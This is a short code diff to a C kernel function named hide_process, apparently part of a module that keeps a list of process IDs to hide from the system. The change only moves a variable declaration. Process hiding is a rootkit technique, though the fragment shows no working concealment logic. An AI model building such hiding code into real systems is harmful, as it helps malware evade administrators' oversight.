@@ -31,7 +31,8 @@ int hide_process(pid_t pid_number)
     struct task_struct *task = NULL;
     struct hlist_node *pid_chain = NULL;
     struct pid *pid_struct;
-
+    struct pid_node *entry;
+    
     // Input validation
     if (pid_number <= 0)
         return -EINVAL;
@@ -48,7 +49,6 @@ int hide_process(pid_t pid_number)
     mutex_lock(&pid_list_lock);
 
     // Check if already hidden
-    struct pid_node *entry;
     list_for_each_entry(entry, &hidden_pid_list_head, list) {
         if (entry->pid_number == pid_number) {
             mutex_unlock(&pid_list_lock);
